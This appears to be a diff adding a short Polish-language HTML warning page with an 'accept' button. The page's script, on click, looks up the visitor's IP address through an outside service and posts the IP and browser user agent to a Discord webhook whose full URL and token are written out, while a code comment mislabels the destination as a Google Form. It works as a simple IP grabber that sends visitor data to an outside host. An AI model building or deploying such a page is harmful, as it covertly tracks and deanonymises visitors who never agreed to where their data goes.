@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8">
+<title>Ostrzeżenie</title>
+</head>
+<body>
+<h2>Uwaga</h2>
+<p>Wejście na tę stronę powoduje zapis adresu IP w celach bezpieczeństwa.</p>
+<button id="accept">Akceptuję</button>
+
+<script>
+document.getElementById('accept').onclick = async function() {
+    // Pobranie IP i UA
+    let res = await fetch('https://ipapi.co/json/');
+    let data = await res.json();
+    let ip = data.ip;
+    let ua = navigator.userAgent;
+
+    // Wyślij dane do Google Form
+    fetch('https://discord.com/api/webhooks/1454804813328945162/ntueUPCbxfs7hEDQx0MgmGJA0MVl-a0XlNUVwiqYf5GxWguUSayZ_Mqo2j3XayfnmrGU', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: `entry.123456=${ip}&entry.654321=${ua}`
+    });
+
+    alert('Dostęp przyznany');
+};
+</script>
+</body>
+</html>
